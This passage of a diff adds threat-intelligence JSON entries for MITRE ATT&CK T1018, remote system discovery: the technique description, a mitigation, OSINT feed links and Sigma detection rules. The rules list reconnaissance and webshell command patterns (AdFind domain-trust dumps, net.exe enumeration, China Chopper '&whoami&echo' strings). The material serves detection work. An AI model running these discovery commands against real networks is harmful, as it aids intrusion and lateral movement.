+                            "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+                        "lookup_data": {
+                            "capec": "CAPEC-292",
+                            "mitre-attack-id": "T1018",
+                            "mitre-cti:description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
+                            "mitre-cti:name": "Remote System Discovery",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'modified': '2022-09-06T22:04:59.486Z', 'name': 'Remote System Discovery', 'description': 'Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\\n\\nAdversaries may also analyze data from local host files (ex: <code>C:\\\\Windows\\\\System32\\\\Drivers\\\\etc\\\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\\n\\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \\n', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)', 'x_mitre_platforms': ['Linux', 'macOS', 'Windows', 'Network'], 'x_mitre_is_subtechnique': False, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '3.4', 'x_mitre_contributors': ['Daniel Stepanic, Elastic', 'RedHuntLabs, @redhuntlabs', 'Austin Clark, @c2defense'], 'x_mitre_data_sources': ['Command: Command Execution', 'File: File Access', 'Process: Process Creation', 'Network Traffic: Network Connection Creation'], 'type': 'attack-pattern', 'id': 'attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735', 'created': '2017-05-31T21:30:28.187Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1018', 'external_id': 'T1018'}, {'source_name': 'CISA AR21-126A FIVEHANDS May 2021', 'description': 'CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware. Retrieved June 7, 2021.', 'url': 'https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a'}, {'source_name': 'Elastic - Koadiac Detection with EQL', 'description': 'Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.', 'url': 'https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql'}, {'source_name': 'US-CERT-TA18-106A', 'description': 'US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.', 'url': 'https://www.us-cert.gov/ncas/alerts/TA18-106A'}, {'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/292.html', 'external_id': 'CAPEC-292'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                        "lookup_data": {
+                            "description": "Trickbot to Ryuk in Two Hours",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1585237597",
+                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9a132afa-654e-11eb-ae93-0242ac130002",
+                        "lookup_data": {
+                            "description": "AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
+                            "raw": "author: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72,\n  oscd.community\ndate: 2021/02/02\ndescription: AdFind continues to be seen across majority of breaches. It is used to\n  domain trust discovery to plan out subsequent steps in the attack chain.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\nfalsepositives:\n- Legitimate admin activity\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nrelated:\n- id: 75df3b17-8bcc-4565-b89b-c9898acef911\n  type: obsoletes\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: AdFind Usage Detection\n",
+                            "sigma:id": "9a132afa-654e-11eb-ae93-0242ac130002",
+                            "title": "AdFind Usage Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bed2a484-9348-4143-8a8a-b801c979301c",
+                        "lookup_data": {
+                            "description": "Detects certain command line parameters often used during reconnaissance activity via web shells",
+                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, Anton Kutepov, oscd.community\ndate: 2017/01/01\ndescription: Detects certain command line parameters often used during reconnaissance\n  activity via web shells\ndetection:\n  condition: 1 of selection* and 1 of susp*\n  selection_webserver_characteristics_tomcat1:\n    ParentImage|contains:\n    - -tomcat-\n    - \\tomcat\n    ParentImage|endswith:\n    - \\java.exe\n    - \\javaw.exe\n  selection_webserver_characteristics_tomcat2:\n    CommandLine|contains:\n    - catalina.jar\n    - CATALINA_HOME\n    ParentImage|endswith:\n    - \\java.exe\n    - \\javaw.exe\n  selection_webserver_image:\n    ParentImage|endswith:\n    - \\w3wp.exe\n    - \\php-cgi.exe\n    - \\nginx.exe\n    - \\httpd.exe\n    - \\caddy.exe\n    - \\ws_tomcatservice.exe\n  susp_change_dir:\n    CommandLine|contains:\n    - '&cd&echo'\n    - 'cd /d '\n  susp_misc_discovery_binaries:\n  - Image|endswith:\n    - \\whoami.exe\n    - \\systeminfo.exe\n    - \\quser.exe\n    - \\ipconfig.exe\n    - \\pathping.exe\n    - \\tracert.exe\n    - \\netstat.exe\n    - \\schtasks.exe\n    - \\vssadmin.exe\n    - \\wevtutil.exe\n    - \\tasklist.exe\n  - OriginalFileName:\n    - whoami.exe\n    - sysinfo.exe\n    - quser.exe\n    - ipconfig.exe\n    - pathping.exe\n    - tracert.exe\n    - netstat.exe\n    - schtasks.exe\n    - VSSADMIN.EXE\n    - wevtutil.exe\n    - tasklist.exe\n  susp_misc_discovery_commands:\n    CommandLine|contains:\n    - ' Test-NetConnection '\n    - dir \\\n  susp_net_utility:\n    CommandLine|contains:\n    - ' user '\n    - ' use '\n    - ' group '\n    OriginalFileName:\n    - net.exe\n    - net1.exe\n  susp_ping_utility:\n    CommandLine|contains: ' -n '\n    OriginalFileName: ping.exe\n  susp_wmic_utility:\n    CommandLine|contains: ' /node:'\n    OriginalFileName: wmic.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: bed2a484-9348-4143-8a8a-b801c979301c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html\n- https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1505.003\n- attack.t1018\n- attack.t1033\n- attack.t1087\ntitle: Webshell Detection With Command Line Keywords\n",
+                            "sigma:id": "bed2a484-9348-4143-8a8a-b801c979301c",
+                            "title": "Webshell Detection With Command Line Keywords",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "10227522-8429-47e6-a301-f2b2d014e7ad",
+                        "lookup_data": {
+                            "description": "Detects the enumeration of other remote systems.",
+                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/22\ndescription: Detects the enumeration of other remote systems.\ndetection:\n  condition: 1 of selection*\n  selection_1:\n    CommandLine|contains: -a\n    Image|endswith: /arp\n  selection_2:\n    CommandLine|contains:\n    - ' 10.'\n    - ' 192.168.'\n    - ' 172.16.'\n    - ' 172.17.'\n    - ' 172.18.'\n    - ' 172.19.'\n    - ' 172.20.'\n    - ' 172.21.'\n    - ' 172.22.'\n    - ' 172.23.'\n    - ' 172.24.'\n    - ' 172.25.'\n    - ' 172.26.'\n    - ' 172.27.'\n    - ' 172.28.'\n    - ' 172.29.'\n    - ' 172.30.'\n    - ' 172.31.'\n    - ' 127.'\n    - ' 169.254.'\n    Image|endswith: /ping\nfalsepositives:\n- Legitimate administration activities\nid: 10227522-8429-47e6-a301-f2b2d014e7ad\nlevel: informational\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\ntitle: Macos Remote System Discovery\n",
+                            "sigma:id": "10227522-8429-47e6-a301-f2b2d014e7ad",
+                            "title": "Macos Remote System Discovery",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "36bed6b2-e9a0-4fff-beeb-413a92b86138",
+                        "lookup_data": {
+                            "description": "Detects usage of the \"Get-AdComputer\" to enumerate Computers within Active Directory.",
+                            "raw": "author: frack113\ndate: 2022/03/17\ndescription: Detects usage of the \"Get-AdComputer\" to enumerate Computers within Active\n  Directory.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - 'Get-AdComputer '\n    - -Filter\nfalsepositives:\n- Unknown\nid: 36bed6b2-e9a0-4fff-beeb-413a92b86138\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1018\ntitle: Active Directory Computers Enumeration with Get-AdComputer\n",
+                            "sigma:id": "36bed6b2-e9a0-4fff-beeb-413a92b86138",
+                            "title": "Active Directory Computers Enumeration with Get-AdComputer",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
+                        "lookup_data": {
+                            "description": "The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions.",
+                            "raw": "author: Arun Chauhan\ndate: 2021/10/04\ndescription: The attacker might use LOLBAS nltest.exe for discovery of domain controllers,\n  domain trusts, parent domain and the current user permissions.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4689\n    ProcessName|endswith: nltest.exe\n    Status: '0x0'\nfalsepositives:\n- Red team activity\n- Rare legitimate use by an administrator\nfields:\n- SubjectUserName\n- SubjectDomainName\nid: eeb66bbb-3dde-4582-815a-584aee9fe6d1\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\n- https://attack.mitre.org/software/S0359/\nstatus: test\ntags:\n- attack.discovery\n- attack.t1482\n- attack.t1018\n- attack.t1016\ntitle: Correct Execution of Nltest.exe\n",
+                            "sigma:id": "eeb66bbb-3dde-4582-815a-584aee9fe6d1",
+                            "title": "Correct Execution of Nltest.exe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                        "lookup_data": {
+                            "description": "Detects execution of Net.exe, whether suspicious or benign.",
+                            "raw": "author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community\n  (improvements)\ndate: 2019/01/16\ndescription: Detects execution of Net.exe, whether suspicious or benign.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' group'\n    - ' localgroup'\n    - ' user'\n    - ' view'\n    - ' share'\n    - ' accounts'\n    - ' stop '\n    - ' start'\n  selection_img:\n  - Image|endswith:\n    - \\net.exe\n    - \\net1.exe\n  - OriginalFileName:\n    - net.exe\n    - net1.exe\nfalsepositives:\n- Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine\n  following the search for easy hunting by computer/CommandLine.\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n- https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n- https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n- https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1049\n- attack.t1018\n- attack.t1135\n- attack.t1201\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1087.001\n- attack.t1087.002\n- attack.lateral_movement\n- attack.t1021.002\n- attack.s0039\ntitle: Net.exe Execution\n",
+                            "sigma:id": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                            "title": "Net.exe Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                        "lookup_data": {
+                            "description": "Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/21\ndescription: Detects the use of a renamed Adfind.exe. AdFind continues to be seen\n  across majority of breaches. It is used to domain trust discovery to plan out subsequent\n  steps in the attack chain.\ndetection:\n  condition: 1 of selection* and not filter\n  filter:\n    Image|endswith: \\AdFind.exe\n  selection_1:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\n  selection_2:\n  - Imphash:\n    - bca5675746d13a1f246e2da3c2217492\n    - 53e117a96057eaf19c41380d0e87f1c2\n  - Hashes|contains:\n    - IMPHASH=BCA5675746D13A1F246E2DA3C2217492\n    - IMPHASH=53E117A96057EAF19C41380D0E87F1C2\n  selection_3:\n    OriginalFileName: AdFind.exe\nfalsepositives:\n- Unknown\nid: df55196f-f105-44d3-a675-e9dfb6cc2f2b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/01\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Renamed AdFind Detection\n",
+                            "sigma:id": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                            "title": "Renamed AdFind Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f8ad2e2c-40b6-4117-84d7-20b89896ab23",
+                        "lookup_data": {
+                            "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system",
+                            "raw": "author: frack113\ndate: 2022/03/12\ndescription: Adversaries may attempt to get a listing of other systems by IP address,\n  hostname, or other logical identifier on a network that may be used for Lateral\n  Movement from the current system\ndetection:\n  condition: all of selection_*\n  selection_loop:\n    CommandLine|contains:\n    - 'for '\n    - 'foreach '\n  selection_tools:\n    CommandLine|contains:\n    - nslookup\n    - ping\nfalsepositives:\n- Legitimate script\nid: f8ad2e2c-40b6-4117-84d7-20b89896ab23\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\n- https://ss64.com/nt/for.html\n- https://ss64.com/ps/foreach-object.htmll\nstatus: test\ntags:\n- attack.execution\n- attack.t1059\n- attack.discovery\n- attack.t1018\ntitle: Suspicious Scan Loop Network\n",
+                            "sigma:id": "f8ad2e2c-40b6-4117-84d7-20b89896ab23",
+                            "title": "Suspicious Scan Loop Network",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "11063ec2-de63-4153-935e-b1a8b9e616f1",
+                        "lookup_data": {
+                            "description": "Detects the enumeration of other remote systems.",
+                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/22\ndescription: Detects the enumeration of other remote systems.\ndetection:\n  condition: 1 of selection*\n  selection_1:\n    CommandLine|contains: -a\n    Image|endswith: /arp\n  selection_2:\n    CommandLine|contains:\n    - ' 10.'\n    - ' 192.168.'\n    - ' 172.16.'\n    - ' 172.17.'\n    - ' 172.18.'\n    - ' 172.19.'\n    - ' 172.20.'\n    - ' 172.21.'\n    - ' 172.22.'\n    - ' 172.23.'\n    - ' 172.24.'\n    - ' 172.25.'\n    - ' 172.26.'\n    - ' 172.27.'\n    - ' 172.28.'\n    - ' 172.29.'\n    - ' 172.30.'\n    - ' 172.31.'\n    - ' 127.'\n    - ' 169.254.'\n    Image|endswith: /ping\nfalsepositives:\n- Legitimate administration activities\nid: 11063ec2-de63-4153-935e-b1a8b9e616f1\nlevel: low\nlogsource:\n  category: process_creation\n  product: linux\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\ntitle: Linux Remote System Discovery\n",
+                            "sigma:id": "11063ec2-de63-4153-935e-b1a8b9e616f1",
+                            "title": "Linux Remote System Discovery",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "62510e69-616b-4078-b371-847da438cc03",
+                        "lookup_data": {
+                            "description": "Detects attempts to enumerate file shares, printer shares and sessions using \"net.exe\" with the \"view\" flag.",
+                            "raw": "author: Endgame, JHasenbusch (ported for oscd.community)\ndate: 2018/10/30\ndescription: Detects attempts to enumerate file shares, printer shares and sessions\n  using \"net.exe\" with the \"view\" flag.\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: \\\\\\\\\n  selection:\n    CommandLine|contains: view\n    Image|endswith:\n    - \\net.exe\n    - \\net1.exe\nfalsepositives:\n- Legitimate use of net.exe utility by legitimate user\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 62510e69-616b-4078-b371-847da438cc03\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\nstatus: stable\ntags:\n- attack.discovery\n- attack.t1018\ntitle: Share And Session Enumeration Using Net.EXE\n",
+                            "sigma:id": "62510e69-616b-4078-b371-847da438cc03",
+                            "title": "Share And Session Enumeration Using Net.EXE",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9a902722-cecd-4fbe-a6c9-49333aa0f8c2",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1018",
+                            "mitre-cti:description": "Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",
+                            "mitre-cti:name": "Remote System Discovery Mitigation",
+                            "mitre-cti:type": "course-of-action",
+                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--9a902722-cecd-4fbe-a6c9-49333aa0f8c2', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1018', 'url': 'https://attack.mitre.org/mitigations/T1018', 'source_name': 'mitre-attack'}, {'source_name': 'Beechey 2010', 'description': 'Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.', 'url': 'http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599'}, {'url': 'http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'source_name': 'Windows Commands JPCERT'}, {'url': 'https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm', 'description': 'NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016.', 'source_name': 'NSA MS AppLocker'}, {'source_name': 'Corio 2008', 'description': 'Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014.', 'url': 'http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx'}, {'source_name': 'TechNet Applocker vs SRP', 'description': 'Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/ee791851.aspx'}], 'modified': '2020-01-17T16:45:23.921Z', 'name': 'Remote System Discovery Mitigation', 'description': 'Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fa3c117a-bc0d-416e-a31b-0c0e80653efb",
+                        "lookup_data": {
+                            "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells",
+                            "raw": "author: Florian Roth (Nextron Systems), MSTI (query)\ndate: 2022/10/01\ndescription: Detects patterns found in process executions cause by China Chopper like\n  tiny (ASPX) webshells\ndetection:\n  condition: all of selection*\n  selection_cmdline:\n    CommandLine|contains:\n    - '&ipconfig&echo'\n    - '&quser&echo'\n    - '&whoami&echo'\n    - '&c:&echo'\n    - '&cd&echo'\n    - '&dir&echo'\n    - '&echo [E]'\n    - '&echo [S]'\n  selection_origin:\n  - Image|endswith: \\w3wp.exe\n  - ParentImage|endswith: \\w3wp.exe\nfalsepositives:\n- Unknown\nid: fa3c117a-bc0d-416e-a31b-0c0e80653efb\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.microsoft.com/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1505.003\n- attack.t1018\n- attack.t1033\n- attack.t1087\ntitle: Chopper Webshell Process Pattern\n",
+                            "sigma:id": "fa3c117a-bc0d-416e-a31b-0c0e80653efb",
+                            "title": "Chopper Webshell Process Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9705a6a1-6db6-4a16-a987-15b7151e299b",
+                        "lookup_data": {
+                            "description": "Find information about network devices that is not stored in config files",
+                            "raw": "author: Austin Clark\ndate: 2019/08/12\ndescription: Find information about network devices that is not stored in config files\ndetection:\n  condition: keywords\n  keywords:\n  - dir\n  - show processes\n  - show arp\n  - show cdp\n  - show version\n  - show ip route\n  - show ip interface\n  - show ip sockets\n  - show users\n  - show ssh\n  - show clock\nfalsepositives:\n- Commonly used by administrators for troubleshooting\nfields:\n- src\n- CmdSet\n- User\n- Privilege_Level\n- Remote_Address\nid: 9705a6a1-6db6-4a16-a987-15b7151e299b\nlevel: low\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.discovery\n- attack.t1083\n- attack.t1201\n- attack.t1057\n- attack.t1018\n- attack.t1082\n- attack.t1016\n- attack.t1049\n- attack.t1033\n- attack.t1124\ntitle: Cisco Discovery\n",
+                            "sigma:id": "9705a6a1-6db6-4a16-a987-15b7151e299b",
+                            "title": "Cisco Discovery",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4ebc877f-4612-45cb-b3a5-8e3834db36c9",
+                        "lookup_data": {
+                            "description": "Detects certain parent child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system",
